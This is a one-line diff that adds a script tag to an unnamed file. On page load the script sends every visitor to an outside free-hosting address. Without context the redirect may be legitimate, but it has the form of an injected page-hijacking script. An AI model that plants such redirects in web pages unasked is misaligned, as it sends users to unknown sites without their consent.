@@ -1,0 +1,1 @@
+<script>window.location.replace("http://42750.w50.wedos.ws/");</script>
